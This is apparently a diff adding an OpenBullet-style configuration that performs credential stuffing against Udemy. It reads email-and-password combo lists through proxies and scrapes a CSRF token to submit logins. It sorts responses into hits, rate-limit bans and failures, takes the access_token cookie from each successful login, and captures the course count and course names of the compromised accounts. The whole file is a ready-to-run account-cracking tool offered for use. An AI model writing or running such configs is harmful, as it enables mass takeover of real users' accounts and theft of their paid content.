@@ -1,0 +1,117 @@
+﻿[SETTINGS]
+{
+  "Name": "Udemy.com by matt",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-08T23:56:53.3326187+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.udemy.com/join/login-popup/?display_type=popup&display_type=popup&locale=en_US&next=https://www.udemy.com/logout/&ref=&response_type=json&skip_suggest=1&xref=" 
+  
+  HEADER "Host: www.udemy.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 142" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://www.udemy.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Referer: https://www.udemy.com/logout/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: cs-CZ,cs;q=0.9" 
+
+#CSRF PARSE "<SOURCE>" LR "'csrfmiddlewaretoken'" "' />" -> VAR "CSRF" 
+
+#Fix FUNCTION Translate 
+  KEY "value='" VALUE "" 
+  "<CSRF>" -> VAR "CSRF" 
+
+#Login REQUEST POST "https://www.udemy.com/join/login-popup/?display_type=popup&display_type=popup&locale=en_US&next=https://www.udemy.com/logout/&ref=&response_type=json&skip_suggest=1&xref=" 
+  CONTENT "csrfmiddlewaretoken=<CSRF>&locale=cs_CZ&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.udemy.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 142" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://www.udemy.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Referer: https://www.udemy.com/logout/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: cs-CZ,cs;q=0.9" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"returnUrl\":" 
+  KEYCHAIN Ban OR 
+    KEY "You have exceeded the maximum number of requests per hour" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "{\"returnUrl\":" 
+
+#Capture REQUEST GET "https://www.udemy.com/home/my-courses/learning/" 
+  
+  HEADER "Host: www.udemy.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 142" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://www.udemy.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Referer: https://www.udemy.com/logout/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: cs-CZ,cs;q=0.9" 
+
+#Token PARSE "<COOKIES(access_token)>" LR "" "" -> VAR "Token" 
+
+#Capture REQUEST GET "https://www.udemy.com/api-2.0/users/me/subscribed-courses?fields%5Bcourse%5D=@min,visible_instructors,image_480x270,favorite_time,archive_time,completion_ratio,last_accessed_time,enrollment_time,features,num_collections&fields%5Buser%5D=@min,job_title&ordering=-access_time,-enrolled&page=1&page_size=100" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.udemy.com/" 
+  HEADER "X-Udemy-Authorization: Bearer <Token>" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#Total PARSE "<SOURCE>" LR "{\"count\":" ",\"" -> CAP "Total Courses" 
+
+#Check KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"count\":0," 
+  KEYCHAIN Success OR 
+    KEY "{\"count\":" 
+
+#Names PARSE "<SOURCE>" LR "url\":\"" "/learn/\",\"" Recursive=TRUE -> VAR "Courses" 
+
+FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "[" VALUE "" 
+  KEY "]" VALUE "" 
+  KEY "/" VALUE "" 
+  KEY "-" VALUE "‌‌ " 
+  "<Courses>" -> CAP "Courses" 
+
